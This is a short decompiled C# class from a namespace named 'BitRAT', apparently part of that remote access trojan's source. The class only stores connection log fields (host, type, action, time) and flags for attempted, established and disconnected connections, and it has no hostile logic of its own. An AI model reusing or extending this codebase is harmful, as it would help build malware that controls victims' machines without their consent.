﻿using System;
using System.Linq;

namespace BitRAT
{
	// Token: 0x020001E3 RID: 483
	public class cLogCon
	{
		// Token: 0x06001AB4 RID: 6836 RVA: 0x000BAC54 File Offset: 0x000B8E54
		public cLogCon()
		{
			this.idxValues = new string[4];
			checked
			{
				int num = this.idxValues.Count<string>() - 1;
				for (int i = 0; i <= num; i++)
				{
					this.idxValues[i] = "N/A";
				}
			}
		}

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x06001AB5 RID: 6837 RVA: 0x0000DA59 File Offset: 0x0000BC59
		// (set) Token: 0x06001AB6 RID: 6838 RVA: 0x0000DA63 File Offset: 0x0000BC63
		public string HOST
		{
			get
			{
				return this.idxValues[0];
			}
			set
			{
				this.idxValues[0] = value;
			}
		}

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x06001AB7 RID: 6839 RVA: 0x0000DA6E File Offset: 0x0000BC6E
		// (set) Token: 0x06001AB8 RID: 6840 RVA: 0x0000DA78 File Offset: 0x0000BC78
		public string TYPE
		{
			get
			{
				return this.idxValues[1];
			}
			set
			{
				this.idxValues[1] = value;
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x06001AB9 RID: 6841 RVA: 0x0000DA83 File Offset: 0x0000BC83
		// (set) Token: 0x06001ABA RID: 6842 RVA: 0x0000DA8D File Offset: 0x0000BC8D
		public string ACTION
		{
			get
			{
				return this.idxValues[2];
			}
			set
			{
				this.idxValues[2] = value;
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x06001ABB RID: 6843 RVA: 0x0000DA98 File Offset: 0x0000BC98
		// (set) Token: 0x06001ABC RID: 6844 RVA: 0x0000DAA2 File Offset: 0x0000BCA2
		public string TIME
		{
			get
			{
				return this.idxValues[3];
			}
			set
			{
				this.idxValues[3] = value;
			}
		}

		// Token: 0x04000A2C RID: 2604
		public string[] idxValues;

		// Token: 0x04000A2D RID: 2605
		public bool bIsAttempt;

		// Token: 0x04000A2E RID: 2606
		public bool bIsEstablished;

		// Token: 0x04000A2F RID: 2607
		public bool bIsDC;
	}
}
